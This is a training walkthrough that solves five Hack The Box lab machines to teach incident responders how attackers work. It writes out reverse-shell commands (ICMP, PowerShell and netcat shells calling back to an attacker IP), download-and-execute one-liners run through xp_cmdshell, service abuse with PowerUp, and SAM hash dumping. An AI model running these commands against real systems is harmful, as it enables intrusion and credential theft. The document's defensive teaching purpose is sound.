# Emulating Threat Methodologies 2

An analyst's job is defense-oriented. IR must actively interpret events to solve
problems under stress and various time constraints. Therefore, our goal is to
constantly develop and improve our competence in---and ultimately master---DFIR
skill sets, including:

- Deny adversary opportunities to attack
- Identify and counter use of offensive techniques
- Evaluate the success and impact of adversary actions
- Explain logic and intent of adversary actions and decisions

<br>

To do this, we need a clear understanding of what offensive actions are being
performed, why they are being used, and what an adversary can obtain/accomplish
on a system at any given time. A great way to do this is by using one of the
many [penetration testing practice and vulnerable app platforms](https://github.com/joe-shenouda/awesome-cyber-skills) available.

This training document will show examples of practicing threat methodologies
using **Hack The Box**, a pen-testing lab platform where you can assess your
current skill level, gauge your progress, and maintain a constant sense of
progression.

We'll walkthrough completing the following systems:

- [Minion](#minion)
	- [Minion Remote Enumeration](#minion-remote-enumeration)
	- [Minion Remote Exploit](#minion-remote-exploit)
	- [Minion Local Enumeration](#minion-local-enumeration)
	- [Minion Local Exploit](#minion-local-exploit)
- [Querier](#querier)
	- [Querier Remote Enumeration](#querier-remote-enumeration)
	- [Querier Remote Exploit](#querier-remote-exploit)
	- [Querier Local Enumeration](#querier-local-enumeration)
	- [Querier Local Exploit](#querier-local-exploit)
- [Bastion](#bastion)
	- [Bastion Remote Enumeration](#bastion-remote-enumeration)
	- [Bastion Remote Exploit](#bastion-remote-exploit)
	- [Bastion Local Enumeration](#bastion-local-enumeration)
	- [Bastion Local Exploit](#bastion-local-exploit)
- [Netmon](#netmon)
	- [Netmon Remote Enumeration](#netmon-remote-enumeration)
	- [Netmon Remote Exploit](#netmon-remote-exploit)
	- [Netmon Local Enumeration](#netmon-local-enumeration)
	- [Netmon Local Exploit](#netmon-local-exploit)
- [Mirai](#mirai)
	- [Mirai Remote Enumeration](#mirai-remote-enumeration)
	- [Mirai Remote Exploit](#mirai-remote-exploit)
	- [Mirai Local Enumeration](#mirai-local-enumeration)
	- [Mirai Local Exploit](#mirai-local-exploit)


## Minion

Minion

- [Minion Remote Enumeration](#minion-remote-enumeration)
- [Minion Remote Exploit](#minion-remote-exploit)
- [Minion Local Enumeration](#minion-local-enumeration)
- [Minion Local Exploit](#minion-local-exploit)


### Minion Remote Enumeration

[Masscan](https://github.com/robertdavidgraham/masscan) discovers one open port:

![](images/Emulating%20Threat%20Methodologies%202/image052.png)<br><br>


[Gobuster](https://github.com/OJ/gobuster) tries pages from a wordlist and finds one named `test.asp`:

![](images/Emulating%20Threat%20Methodologies%202/image043.png)<br><br>

When visited, this page reports it needs a parameter in the request:

![](images/Emulating%20Threat%20Methodologies%202/image053.png)<br><br>

Give it an argument such as `http://127.0.0.1`:

![](images/Emulating%20Threat%20Methodologies%202/image054.png)<br><br>

Inspect this page and you will discover another page named `cmd.aspx`:

![](images/Emulating%20Threat%20Methodologies%202/image055.png)<br><br>

This is a page that takes a system command as an argument:

![](images/Emulating%20Threat%20Methodologies%202/image056.png)<br><br>

We can give it the argument `ping 10.10.14.11` and listen for the ping requests with `tcpdump`:

![](images/Emulating%20Threat%20Methodologies%202/image057.png)<br><br>

This tells us we have remote code execution.

### Minion Remote Exploit

Try writing files to different directories while watching the Error Code (0=Success
	1=Failure) to see where writing is possible:

![](images/Emulating%20Threat%20Methodologies%202/image059.png)<br><br>

After experimenting with commands, you'll find that only ICMP is allowed out
from the victim machine.  This presents the opportunity to use an ICMP shell
with `icmpsh_m.py`:

```bash
# Disable ping replies
sysctl -w net.ipv4.icmp_echo_ignore_all=1

# Copy over and start ICMP shell server
cp /usr/share/sqlmap/extra/icmpsh/icmpsh_m.py .
python icmpsh_m.py <attacker ip> <victim ip>
```

<br>

So we have the ICMP Shell server listening, now we need to write an ICMP shell
client to the victim host and execute it.

The quickest way to do this is to write it line by line using the following
bash script:

```bash
#!/bin/bash
export IFS=$'\n'
for line in $(icmp.txt);do
	data="echo ${line} >> C:\Windows\Temp\c.ps1"
	curl -v -G -X GET 'http://10.10.10.57:62696/test.asp?u=http://127.0.0.1/cmd.aspx' --data-urlencode "xcmd=$data"
done
```

The `icmp.txt` file is a condensed copy of [Invoke-PowerShellIcmp](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellIcmp.ps1)
with the attacking machine's address added:

![](images/Emulating%20Threat%20Methodologies%202/image060.png)<br><br>

Running the bash script will write the file to the victim host one line at a time:

![](images/Emulating%20Threat%20Methodologies%202/image061.png)<br><br>

After the file is written, execute the `.ps1` with one last web request to begin
executing commands over ICMP:

![](images/Emulating%20Threat%20Methodologies%202/image062.png)<br><br>

### Minion Local Enumeration

After enumerating as a local user, you will find a script `C:\sysadmscripts\c.ps1`
that is run every few minutes by a `.bat` file in the same directory:

![](images/Emulating%20Threat%20Methodologies%202/image063.png)<br><br>

Full permissions for `c.ps1` have been granted to `EVERYONE`:

![](images/Emulating%20Threat%20Methodologies%202/image064.png)<br><br>

That means we can write commands into the file and they will be executed
when the script runs:

![](images/Emulating%20Threat%20Methodologies%202/image065.png)<br><br>

After the script runs, we can see the contents of the `user.txt` file and see
what account the script is running under by checking the `whoami.txt` file:

![](images/Emulating%20Threat%20Methodologies%202/image066.png)<br><br>

Additional enumeration reveals `backup.zip` on the `decoder.MINION` user's
Desktop.  A password hash can be found within this file:

![](images/Emulating%20Threat%20Methodologies%202/image067.png)<br><br>

This can be cracked using crackstation.net or other similar tool/site:

![](images/Emulating%20Threat%20Methodologies%202/image068.png)<br><br>

### Minion Local Exploit

With the password to the Administrator account, we can access the `root.txt`
file which tells us to run `root.exe`.  

Here are the commands to run the program under the `Administrator` account:

```powershell
$user="minion\administrator"
$pass="1234test" | ConvertTo-SecureString -AsPlainText -Force
$c = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $user,$pass
Invoke-Command -ComputerName minion -Credential $c -Command {cd C:\Users\Administrator\Desktop; .\root.exe}
```

<br>

If you don't run it from the `C:\Users\Administrator\Desktop`
directory, you get an error message:

![](images/Emulating%20Threat%20Methodologies%202/image069.png)<br><br>

Running it from the correct directory returns the contents of the root flag:

![](images/Emulating%20Threat%20Methodologies%202/image070.png)<br><br>

## Querier

- [Querier Remote Enumeration](#querier-remote-enumeration)
- [Querier Remote Exploit](#querier-remote-exploit)
- [Querier Local Enumeration](#querier-local-enumeration)
- [Querier Local Exploit](#querier-local-exploit)

### Querier Remote Enumeration

Port and service version scans show several services on the host:

![](images/Emulating%20Threat%20Methodologies%202/image015.png)<br><br>

A public share is discovered containing a `.xlsm` file:

![](images/Emulating%20Threat%20Methodologies%202/image016.png)<br><br>

Inside this file is a macro that connects to a MSSQL database which contains credentials:

![](images/Emulating%20Threat%20Methodologies%202/image024.png)<br><br>

### Querier Remote Exploit

These credentials can be used to access the database:

![](images/Emulating%20Threat%20Methodologies%202/image032.png)<br><br>

You can then force the server to authenticate to the attacking box which allows
the capture of an NTLM hash.

With Responder running, tell MSSQL to request a resource at the attacker IP:

![](images/Emulating%20Threat%20Methodologies%202/image033.png)<br><br>

Responder will simulate authentication in order to capture the account NTLM hash:

![](images/Emulating%20Threat%20Methodologies%202/image034.png)<br><br>

This hash can be cracked using the `rockyou.txt` wordlist in Kali:

![](images/Emulating%20Threat%20Methodologies%202/image035.png)<br><br>

After recovering the password, use this account to logon to the MSSQL server.  Enable `xp_cmdshell` with `enable_xp_cmdshell` then execute commands with `xp_cmdshell <command>`:

![](images/Emulating%20Threat%20Methodologies%202/image036.png)<br><br>

We can use Nishang again, this time the `Invoke-PowerShellTcp.ps1` script.  Download
it to the attacking machine and add a command at the end of the file:

```bash
# Download script
wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1

# Add command with attacker address
echo Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.95 -Port 4444 >> Invoke-PowerShellTcp.ps1

# Serve the script over HTTP port 8000
python3 -m http.server
```

<br>

Now listen for the reverse shell with `nc -nlvp 4444` and use
`xp_cmdshell` to download the `Invoke-PowerShellTcp.ps1` script and run it:

```powershell
xp_cmdshell powershell iex(new-object net.webclient).DownloadString(\"http://10.10.16.95:8000/Invoke-PowerShellTcp.ps1\")
```

<br>

You should now have an interactive PowerShell reverse shell on the victim:

![](images/Emulating%20Threat%20Methodologies%202/image072.png)<br><br>

### Querier Local Enumeration

Now it's time to enumerate the system using the `mssql-svc` account.  Download
the `PowerUp.ps1` script and add the `Invoke-AllChecks` to the end
of the file:

```bash
wget https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/dev/PowerUp/PowerUp.ps1
echo Invoke-AllChecks >> PowerUp.ps1
```

<br>

Download to the victim host and run with:

```powershell
iex(new-object net.webclient).DownloadString('http://10.10.16.95:8000/PowerUp.ps1')
```

![](images/Emulating%20Threat%20Methodologies%202/image073.png)<br><br>

A GPP file that contains credentials is discovered:

![](images/Emulating%20Threat%20Methodologies%202/image071.png)<br><br>

Now you have the password for the Administrator account.  Another way is to exploit
the `UsoSvc` service by modifying its binary:

![](images/Emulating%20Threat%20Methodologies%202/image074.png)<br><br>

### Querier Local Exploit

`PowerUp` has a built in function to do this.  First download the program you
want the service to run (`nc.exe` in this case).

```powershell
Invoke-WebRequest -Uri 'http://10.10.16.95:5555/nc.exe' -OutFile ".\nc.exe"
```

<br>

Then use `Invoke-ServiceAbuse` to configure the `UsoSvc` service to run it:

```powershell
Invoke-ServiceAbuse -Name 'UsoSvc' -Command 'C:\temp\nc.exe 10.10.16.95 5555 -e cmd.exe'
```

![](images/Emulating%20Threat%20Methodologies%202/image075.png)<br><br>

Listen for the `netcat` reverse shell on the attacking machine with `nc -nlvp 5555`:

![](images/Emulating%20Threat%20Methodologies%202/image076.png)<br><br>


## Bastion

This machine is called Bastion:

- [Bastion Remote Enumeration](#bastion-remote-enumeration)
- [Bastion Remote Exploit](#bastion-remote-exploit)
- [Bastion Local Enumeration](#bastion-local-enumeration)
- [Bastion Local Exploit](#bastion-local-exploit)

<br>

### Bastion Remote Enumeration

First identify all open TCP ports and services that are listening:

```
nmap -Pn -p1-65535 -o tcp-$ip $ip | grep -v 'filtered|closed'
for p in $(grep open tcp-$ip | cut -d "/" -f 1);do nmap -Pn -sV -p$p $ip|grep open >> ver-$ip; done
```

<br>

We now have a list of open services in the `ver-$ip` file:

![](images/Emulating%20Threat%20Methodologies%202/image018.png)<br><br>

Now look more closely at each service.

File sharing is a good place to start.  List available SMB shares with:

```
smbclient -L $ip -N
```

![](images/Emulating%20Threat%20Methodologies%202/image019.png)<br><br>

Try to mount each SMB share.  The `Backups` share does not require authentication:

```
smbclient \\\\$ip\\Backups -N
```

![](images/Emulating%20Threat%20Methodologies%202/image020.png)<br><br>

After browsing the files on the share, two backup VHDs are discovered that contain lots of interesting data:

![](images/Emulating%20Threat%20Methodologies%202/image021.png)<br><br>


### Bastion Remote Exploit

Remotely exploiting the system in this case means mounting the virtual hard disk and extracting credentials.

Mount the SMB share

```
mkdir Backups
mount -t cifs //$ip/Backups Backups -o ro
```

![](images/Emulating%20Threat%20Methodologies%202/image022.png)<br><br>


Install `guestmount` and mount the VHD:

```
mkdir vhd
apt-get install libguestfs-tools
guestmount --add <filename.vhd> -m /dev/sda1 --ro vhd
```

![](images/Emulating%20Threat%20Methodologies%202/image023.png)<br><br>


Get password hashes from the SAM file by copying over `SYSTEM` and `SAM` files and running `samdump2`:

```
cp /path/to/Windows/System32/config/SYSTEM .
cp /path/to/Windows/System32/config/SAM .
samdump2 SYSTEM SAM
```

![](images/Emulating%20Threat%20Methodologies%202/image017.png)<br><br>

Crack the password hash with JTR, hashcat, or a service like crackstation:

![](images/Emulating%20Threat%20Methodologies%202/image025.png)<br><br>

The Administrator and Guest accounts are disabled and their hashes are blank.  But you can use the `L4mpje` account username and password to log on to the machine via SSH:

![](images/Emulating%20Threat%20Methodologies%202/image026.png)<br><br>


### Bastion Local Enumeration

Now with user privileges you can perform some local enumeration.

After some investigation, you'll find a program named **mRemoteNG** that can be exploited:

![](images/Emulating%20Threat%20Methodologies%202/image027.png)<br><br>


### Bastion Local Exploit

This [post](https://hackersvanguard.com/mremoteng-insecure-password-storage) describes how the mRemoteNG program stores account passwords insecurely.

Copying the `confCons.xml` file from `C:\Users\L4mpje\AppData\Roaming\mRemoteNG` onto a Windows VM with mRemoteNG installed allows us to perform this technique and recover the password for the Administrator account:

![](images/Emulating%20Threat%20Methodologies%202/image028.png)<br><br>

When we log in with the Administrator account via SSH, we can look at any file on the system:

![](images/Emulating%20Threat%20Methodologies%202/image029.png)<br><br>


## Netmon

This box is named Netmon

- [Netmon Remote Enumeration](#netmon-remote-enumeration)
- [Netmon Remote Exploit](#netmon-remote-exploit)
- [Netmon Local Enumeration](#netmon-local-enumeration)
- [Netmon Local Exploit](#netmon-local-exploit)

<br>

### Netmon Remote Enumeration

Identify all open TCP/UCP ports and services, then perform separate TCP and UDP scans with Nmap capturing the output into files.

This provides a `ver-<ip-address>` file with all discovered services:

![](images/Emulating%20Threat%20Methodologies%202/image031.png)<br><br>

FTP is one of the services that appears to be open.  

List Nmap FTP scripts with `ls /usr/share/nmap/scripts | grep ftp` and run a few using the following:

![](images/Emulating%20Threat%20Methodologies%202/image003.png)<br><br>

We see the FTP service allows anonymous logons.

A similiar Nmap HTTP script identifies the web service running on port 80 belongs to Paessler PRTG:

![](images/Emulating%20Threat%20Methodologies%202/image004.png)<br><br>

We now know the system provides anonymous FTP access and is hosting a PRTG web server.


### Netmon Remote Exploit

A quick search for PRTG vulnerabilityes reveals [this version stores its admin password in plaintext](https://www.paessler.com/about-prtg-17-4-35-through-18-1-37).

We can obtain this configuration file using FTP:

![](images/Emulating%20Threat%20Methodologies%202/image005.png)<br><br>

And search it for the password:

![](images/Emulating%20Threat%20Methodologies%202/image006.png)<br><br>

Trying this one won't work, but adjusting for the current year (2019) does:

![](images/Emulating%20Threat%20Methodologies%202/image007.png)<br><br>


### Netmon Local Enumeration

With access to the web application, we can begin searching for opportunities to
escalate privileges.  

A quick search for exploits associated with that specific program shows a
[command injection vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2018-9276)
was recently discovered.

You can test this using the following page:

![](images/Emulating%20Threat%20Methodologies%202/image008.png)<br><br>

And including a command like below:

![](images/Emulating%20Threat%20Methodologies%202/image009.png)<br><br>

### Netmon Local Exploit

There is already a [proof of concept](https://www.exploit-db.com/exploits/46527)
(POC) that will perform this exploit for us:

![](images/Emulating%20Threat%20Methodologies%202/image010.png)<br><br>

The usage instructs us to include our cookie which can be quickly discovered
using the built-in debugger in the browser `F12`:

![](images/Emulating%20Threat%20Methodologies%202/image011.png)<br><br>

The script runs and creates a new user with password:

![](images/Emulating%20Threat%20Methodologies%202/image012.png)<br><br>

We can now use a number of different tools to log in as that user via SMB:

![](images/Emulating%20Threat%20Methodologies%202/image013.png)<br><br>

At this point you can complete the challenge and report the hashes that are
available after owning the user and/or root user:

![](images/Emulating%20Threat%20Methodologies%202/image014.png)<br><br>


## Mirai

- [Mirai Remote Enumeration](#mirai-remote-enumeration)
- [Mirai Remote Exploit](#mirai-remote-exploit)
- [Mirai Local Enumeration](#mirai-local-enumeration)
- [Mirai Local Exploit](#mirai-local-exploit)


### Mirai Remote Enumeration

Initial scan reveals some open services:

![](images/Emulating%20Threat%20Methodologies%202/image077.png)<br><br>

Searching for web pages with `Gobuster` returns an `/admin` page:

![](images/Emulating%20Threat%20Methodologies%202/image078.png)<br><br>

The page is an admin console for a Raspberry Pi:

![](images/Emulating%20Threat%20Methodologies%202/image079.png)<br><br>

### Mirai Remote Exploit

Trying the default username and password for this one is enough to get access:

![](images/Emulating%20Threat%20Methodologies%202/image080.png)<br><br>

### Mirai Local Enumeration

Once local access is obtained, we can grab the `user.txt` file:

![](images/Emulating%20Threat%20Methodologies%202/image081.png)<br><br>

We get denied when trying to read from the `/root` directory, but using `sudo`
works:

![](images/Emulating%20Threat%20Methodologies%202/image082.png)<br><br>

List mounted filesystems with `df -h` and we see `/media/usbstick` was mounted
at `/dev/sdb`:

![](images/Emulating%20Threat%20Methodologies%202/image083.png)<br><br>

Checking that location we find a file named `damnit.txt` which indicates the
`root.txt` file was deleted:

![](images/Emulating%20Threat%20Methodologies%202/image084.png)<br><br>

### Mirai Local Exploit

Searching the device where the filesystem was mounted reveals the root flag:

![](images/Emulating%20Threat%20Methodologies%202/image085.png)<br><br>


## Summary

Start with knowledge, build that knowledge into skills using practical
application, and constantly refine these skills through practice and testing.
This will improve each skill individually as well as your ability to integrate
and interface between different skill sets with speed and accuracy.

Training labs are a learning tool that can increase your understanding of
adversary approaches and attacks. Emulation and practical application improves
your ability to correctly identify and address them during an incident.

Yes, CTF and pentesting challenges are different from apex actors targeting
your network. Still, they are a great way to build your skills and confidence
in identifying and understanding offensive tools, techniques, and strategies.
